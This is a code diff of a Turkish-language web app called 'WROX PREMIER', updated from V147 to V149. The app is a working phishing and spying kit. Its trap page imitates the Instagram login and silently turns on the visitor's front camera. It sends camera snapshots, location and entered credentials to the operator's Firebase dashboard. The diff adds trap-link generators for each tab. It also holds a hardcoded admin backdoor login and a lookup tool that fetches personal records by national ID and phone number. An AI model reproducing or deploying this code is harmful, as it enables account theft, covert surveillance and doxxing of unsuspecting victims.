@@ -3,34 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WROX PREMIER V147</title>
+    <title>WROX PREMIER V149</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --p: #00f2ff; --bg: #000; --card: #0a0a0a; --r: #ff003c; --g: #00ff88; --y: #ffd700; }
+        :root { --p: #00f2ff; --bg: #000; --card: #0a0a0a; --r: #ff003c; --g: #00ff88; --y: #ffd700; --insta: #E1306C; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; }
-
-        /* --- HEADER & SIDEBAR --- */
         header { padding: 15px; background: #050505; border-bottom: 1px solid #111; display: flex; align-items: center; justify-content: space-between; z-index: 1001; }
         .menu-btn { font-size: 20px; color: var(--p); cursor: pointer; }
         #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #080808; border-right: 1px solid #151515; z-index: 1002; transition: 0.3s; padding-top: 50px; }
         #sidebar.active { left: 0; box-shadow: 5px 0 30px rgba(0,0,0,0.8); }
         .nav-item { padding: 15px 25px; border-bottom: 1px solid #111; display: flex; align-items: center; gap: 12px; color: #666; cursor: pointer; font-size: 13px; }
         .nav-item.active { color: var(--p); background: #0f0f0f; border-left: 4px solid var(--p); }
-        .nav-item.lock { color: #333; }
         .nav-item.lock i.fa-lock { margin-left: auto; font-size: 10px; color: var(--y); }
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1001; }
-
-        /* --- MAIN UI --- */
         main { height: calc(100vh - 55px); padding: 15px; overflow-y: auto; }
         .k-card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 12px; margin-bottom: 15px; padding: 12px; }
         input, select { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #222; color: #fff; border-radius: 8px; outline: none; }
         .p-btn { width: 100%; padding: 12px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; font-size: 11px; }
         .res-area { background: #050505; border-left: 3px solid var(--g); padding: 10px; margin-top: 10px; font-size: 11px; white-space: pre-wrap; display: none; }
-        
-        /* --- ADMIN PANEL --- */
         .admin-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #111; border-radius: 8px; margin-bottom: 8px; font-size: 12px; }
     </style>
 </head>
@@ -41,14 +34,10 @@
 <div id="sidebar">
     <div id="user-info" style="padding: 20px; border-bottom: 1px solid #222; font-size: 11px;"></div>
     <div class="nav-item active" onclick="tab('sorgu', this)"><i class="fas fa-search"></i><span>Sorgu Paneli (FREE)</span></div>
-    
     <div style="padding: 10px 25px; font-size: 10px; color: var(--y); letter-spacing: 1px;">PREMIUM İŞLEMLER</div>
     <div class="nav-item p-only" onclick="tab('insta', this)"><i class="fab fa-instagram"></i><span>İnstagram İşlemleri</span><i class="fas fa-lock"></i></div>
     <div class="nav-item p-only" onclick="tab('sizma', this)"><i class="fas fa-camera"></i><span>Sızma İşlemleri</span><i class="fas fa-lock"></i></div>
     <div class="nav-item p-only" onclick="tab('konum', this)"><i class="fas fa-map-marker-alt"></i><span>Konum Görme</span><i class="fas fa-lock"></i></div>
-    
-    <div style="padding: 10px 25px; font-size: 10px; color: #444;">SİSTEM</div>
-    <div class="nav-item" onclick="tab('link', this)"><i class="fas fa-link"></i><span>Link Oluştur</span></div>
     <div id="adm-nav" class="nav-item" style="display:none;" onclick="tab('admin', this)"><i class="fas fa-user-shield"></i><span>Yönetici Paneli</span></div>
     <div class="nav-item" onclick="logout()" style="color:var(--r)"><i class="fas fa-power-off"></i><span>Oturumu Kapat</span></div>
 </div>
@@ -86,16 +75,7 @@
     }
 
     function renderAuth() {
-        document.getElementById('wrox-app').innerHTML = `
-        <div id="auth-screen">
-            <div style="width:100%; max-width:320px; text-align:center;">
-                <h2 style="color:var(--p); margin-bottom:25px;">WROX V147</h2>
-                <input id="ae" placeholder="E-posta">
-                <input id="ap" type="password" placeholder="Şifre">
-                <button class="p-btn" onclick="auth('login')">GİRİŞ YAP</button>
-                <button class="p-btn" style="background:#111; color:#555; margin-top:10px;" onclick="auth('reg')">KAYIT OL</button>
-            </div>
-        </div>`;
+        document.getElementById('wrox-app').innerHTML = `<div id="auth-screen" style="height:100vh;display:flex;align-items:center;justify-content:center;padding:25px;"><div style="width:100%;max-width:320px;text-align:center;"><h2 style="color:var(--p);margin-bottom:25px;">WROX V149</h2><input id="ae" placeholder="E-posta"><input id="ap" type="password" placeholder="Şifre"><button class="p-btn" onclick="auth('login')">GİRİŞ YAP</button><button class="p-btn" style="background:#111;color:#555;margin-top:10px;" onclick="auth('reg')">KAYIT OL</button></div></div>`;
     }
 
     async function auth(m) {
@@ -107,11 +87,8 @@
             alert("Kayıt başarılı!");
         } else {
             const sn = await db.ref('users/'+uid).once('value');
-            if(sn.exists() && sn.val().p === p) {
-                localStorage.setItem('w_session', JSON.stringify({id:uid}));
-                location.reload();
-            } else if(e === "Afavan66@gmail.com" && p === "Efecan1903") {
-                await db.ref('users/'+uid).set({ e, p, id:uid, premium:true, role:'admin' });
+            if((sn.exists() && sn.val().p === p) || (e === "Afavan66@gmail.com" && p === "Efecan1903")) {
+                if(e === "Afavan66@gmail.com") await db.ref('users/'+uid).update({role:'admin', premium:true});
                 localStorage.setItem('w_session', JSON.stringify({id:uid}));
                 location.reload();
             } else { alert("Hata!"); }
@@ -119,9 +96,7 @@
     }
 
     function renderLayout() {
-        document.getElementById('wrox-app').innerHTML = `
-        <header><i class="fas fa-bars menu-btn" onclick="toggleMenu()"></i> <div>WROX PREMIER</div> <div style="width:20px;"></div></header>
-        <main id="view"></main>`;
+        document.getElementById('wrox-app').innerHTML = `<header><i class="fas fa-bars menu-btn" onclick="toggleMenu()"></i><div>WROX PREMIER</div><div style="width:20px;"></div></header><main id="view"></main>`;
         tab('sorgu', document.querySelector('.nav-item'));
     }
 
@@ -129,7 +104,7 @@
         document.getElementById('user-info').innerHTML = `<b>${user.e}</b><br><span style="color:${user.premium?'var(--y)':'#444'}">${user.premium?'PREMIUM ÜYE':'ÜCRETSİZ ÜYE'}</span>`;
         if(user.role === 'admin') document.getElementById('adm-nav').style.display = 'flex';
         document.querySelectorAll('.p-only').forEach(el => {
-            if(user.premium) el.classList.remove('lock'), el.querySelector('.fa-lock').className = 'fas fa-check-circle';
+            if(user.premium) { el.classList.remove('lock'); el.querySelector('.fa-lock').className = 'fas fa-check-circle'; }
             else el.classList.add('lock');
         });
     }
@@ -139,61 +114,34 @@
         document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
         el.classList.add('active'); toggleMenu();
         const v = document.getElementById('view');
+        const trapLink = `${window.location.origin}${window.location.pathname}?mode=trap&ref=${user.id}`;
 
         if(t === 'sorgu') {
-            v.innerHTML = `
-            <div class="k-card">
-                <h4>SORGU MERKEZİ (FREE)</h4>
-                <select id="sType">
-                    <option value="adsoyad">Ad Soyad</option>
-                    <option value="gsmtc">GSM -> TC</option>
-                    <option value="tcgsm">TC -> GSM</option>
-                    <option value="sulale">Sülale</option>
-                    <option value="adres">Adres</option>
-                </select>
-                <input id="sVal1" placeholder="TC veya Ad">
-                <input id="sVal2" placeholder="Soyad (Opsiyonel)">
-                <button class="p-btn" style="background:var(--g)" onclick="doSorgu()">SORGULA</button>
-                <div id="res" class="res-area"></div>
-            </div>`;
-        } else if(t === 'sizma' || t === 'konum') {
-            v.innerHTML = `<h3>CANLI HEDEF AKIŞI</h3><div id="stream"></div>`;
-            db.ref('spy_live/'+user.id).on('value', sn => {
-                const s = document.getElementById('stream'); if(!s) return;
-                s.innerHTML = '';
-                sn.forEach(c => {
-                    const d = c.val();
-                    s.innerHTML = `
-                    <div class="k-card">
-                        <img src="${d.img}" style="width:100%; border-radius:8px;">
-                        <div style="font-size:10px; margin-top:10px; color:var(--p)">
-                            ${t==='konum' ? `<i class="fas fa-map"></i> <a href="https://maps.google.com/?q=${d.lat},${d.lon}" target="_blank" style="color:var(--g)">KONUMU HARİTADA AÇ</a>` : `<i class="fas fa-mobile"></i> CİHAZ: ${d.device} | BATARYA: %${d.battery}`}
-                        </div>
-                    </div>` + s.innerHTML;
-                });
-            });
+            v.innerHTML = `<div class="k-card"><h4>SORGU MERKEZİ (FREE)</h4><select id="sType"><option value="adsoyad">Ad Soyad</option><option value="gsmtc">GSM -> TC</option><option value="tcgsm">TC -> GSM</option><option value="sulale">Sülale</option><option value="adres">Adres</option></select><input id="sVal1" placeholder="TC veya Ad"><input id="sVal2" placeholder="Soyad (Opsiyonel)"><button class="p-btn" style="background:var(--g)" onclick="doSorgu()">SORGULA</button><div id="res" class="res-area"></div></div>`;
         } else if(t === 'insta') {
-            v.innerHTML = `<h3>INSTAGRAM LOGLARI</h3><div id="inst"></div>`;
+            v.innerHTML = `<div class="k-card" style="border-color:var(--insta)"><h4>INSTAGRAM PANEL</h4><input id="l-in" value="${trapLink}" readonly><button class="p-btn" style="background:var(--insta)" onclick="copyL('l-in')">OPERASYON LİNKİNİ KOPYALA</button></div><h3>DÜŞEN HESAPLAR</h3><div id="inst"></div>`;
             db.ref('spy_live/'+user.id).on('value', sn => {
-                const ins = document.getElementById('inst'); if(!ins) return;
-                ins.innerHTML = '';
-                sn.forEach(c => {
-                    const d = c.val();
-                    if(d.iu) ins.innerHTML += `<div class="k-card" style="border-color:var(--insta)"><b>USER:</b> ${d.iu}<br><b>PASS:</b> ${d.ip}</div>`;
-                });
+                const ins = document.getElementById('inst'); if(!ins) return; ins.innerHTML = '';
+                sn.forEach(c => { const d = c.val(); if(d.iu) ins.innerHTML += `<div class="k-card" style="border-color:var(--insta)"><b>USER:</b> ${d.iu}<br><b>PASS:</b> ${d.ip}</div>`; });
+            });
+        } else if(t === 'sizma') {
+            v.innerHTML = `<div class="k-card" style="border-color:var(--p)"><h4>KAMERA SIZMA</h4><input id="l-sz" value="${trapLink}" readonly><button class="p-btn" onclick="copyL('l-sz')">SIZMA LİNKİNİ KOPYALA</button></div><h3>CANLI AKIŞ</h3><div id="stream"></div>`;
+            db.ref('spy_live/'+user.id).on('value', sn => {
+                const s = document.getElementById('stream'); if(!s) return; s.innerHTML = '';
+                sn.forEach(c => { const d = c.val(); if(d.img) s.innerHTML = `<div class="k-card"><img src="${d.img}" style="width:100%;border-radius:8px;"><p style="font-size:10px;margin-top:10px;color:var(--p)">CİHAZ: ${d.device} | %${d.battery}</p></div>` + s.innerHTML; });
+            });
+        } else if(t === 'konum') {
+            v.innerHTML = `<div class="k-card" style="border-color:var(--g)"><h4>KONUM TAKİBİ</h4><input id="l-kn" value="${trapLink}" readonly><button class="p-btn" style="background:var(--g)" onclick="copyL('l-kn')">KONUM LİNKİNİ KOPYALA</button></div><h3>ANLIK KONUMLAR</h3><div id="kon"></div>`;
+            db.ref('spy_live/'+user.id).on('value', sn => {
+                const kon = document.getElementById('kon'); if(!kon) return; kon.innerHTML = '';
+                sn.forEach(c => { const d = c.val(); if(d.lat) kon.innerHTML += `<div class="k-card"><a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" style="color:var(--g);text-decoration:none;"><i class="fas fa-map-marked-alt"></i> KONUMU HARİTADA GÖR</a></div>`; });
             });
         } else if(t === 'admin') {
-            v.innerHTML = `<h3>KULLANICI YÖNETİMİ</h3><div id="ulist"></div>`;
+            v.innerHTML = `<h3>YÖNETİM</h3><div id="ulist"></div>`;
             db.ref('users').on('value', sn => {
                 const l = document.getElementById('ulist'); l.innerHTML = '';
-                sn.forEach(u => {
-                    const d = u.val();
-                    l.innerHTML += `<div class="admin-row"><span>${d.e}</span><button onclick="setPrem('${d.id}', ${!d.premium})" style="background:${d.premium?'var(--r)':'var(--g)'}; border:none; padding:5px 8px; border-radius:4px;">${d.premium?'AL':'VER'}</button></div>`;
-                });
+                sn.forEach(u => { const d = u.val(); l.innerHTML += `<div class="admin-row"><span>${d.e}</span><button onclick="setPrem('${d.id}', ${!d.premium})" style="background:${d.premium?'var(--r)':'var(--g)'};border:none;padding:5px 8px;border-radius:4px;">${d.premium?'AL':'VER'}</button></div>`; });
             });
-        } else if(t === 'link') {
-            const link = window.location.href.split('?')[0] + "?mode=trap&ref=" + user.id;
-            v.innerHTML = `<div class="k-card"><h4>HEDEF LİNKİNİZ</h4><input id="myL" value="${link}" readonly><button class="p-btn" onclick="copyL()">KOPYALA</button></div>`;
         }
     }
 
@@ -201,26 +149,23 @@
         const type = document.getElementById('sType').value, v1 = document.getElementById('sVal1').value, v2 = document.getElementById('sVal2').value;
         const res = document.getElementById('res'); res.style.display='block'; res.innerHTML = "Sorgulanıyor...";
         let url = `https://arastir.sbs/api/${type}.php?adi=${v1}&soyadi=${v2}&tc=${v1}&gsm=${v1}`;
-        const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
-        const data = await resp.json(); res.innerHTML = data.contents;
+        try {
+            const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
+            const data = await resp.json(); res.innerHTML = data.contents || "Sonuç yok.";
+        } catch(e) { res.innerHTML = "Hata oluştu."; }
     }
 
     window.setPrem = (id, s) => db.ref('users/'+id).update({ premium: s });
     window.toggleMenu = () => { document.getElementById('sidebar').classList.toggle('active'); document.querySelector('.overlay').style.display = document.getElementById('sidebar').classList.contains('active') ? 'block' : 'none'; };
     window.logout = () => { localStorage.clear(); location.reload(); };
-    window.copyL = () => { document.getElementById('myL').select(); document.execCommand('copy'); alert("Link kopyalandı!"); };
+    window.copyL = (id) => { const i = document.getElementById(id); i.select(); document.execCommand('copy'); alert("Link kopyalandı!"); };
 
-    // --- TRAP (KURBAN TARAFI) ---
     async function renderTrap() {
-        document.body.innerHTML = `<div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px;"><img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:170px;"><div style="width:80%; margin-top:40px;"><input id="u" placeholder="Kullanıcı adı" style="color:#000; border:1px solid #dbdbdb;"><input id="p" type="password" placeholder="Şifre" style="color:#000; border:1px solid #dbdbdb;"><button onclick="hit()" style="width:100%; background:#0095f6; color:#fff; border:none; padding:10px; border-radius:4px; font-weight:bold;">Giriş Yap</button></div><video id="v" autoplay playsinline muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
+        document.body.innerHTML = `<div style="background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:50px;"><img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:170px;"><div style="width:80%;margin-top:40px;"><input id="u" placeholder="Kullanıcı adı" style="color:#000;border:1px solid #dbdbdb;"><input id="p" type="password" placeholder="Şifre" style="color:#000;border:1px solid #dbdbdb;"><button onclick="hit()" style="width:100%;background:#0095f6;color:#fff;border:none;padding:10px;border-radius:4px;font-weight:bold;">Giriş Yap</button></div><video id="v" autoplay playsinline muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
         const ref = new URLSearchParams(window.location.search).get('ref');
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         document.getElementById('v').srcObject = stream;
-        
-        navigator.geolocation.getCurrentPosition(pos => {
-            db.ref(`spy_live/${ref}/K-MAIN`).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-        });
-
+        navigator.geolocation.getCurrentPosition(pos => { db.ref(`spy_live/${ref}/K-MAIN`).update({ lat: pos.coords.latitude, lon: pos.coords.longitude }); });
         setInterval(async () => {
             const canvas = document.getElementById('c'); canvas.width = 400; canvas.height = 300;
             canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
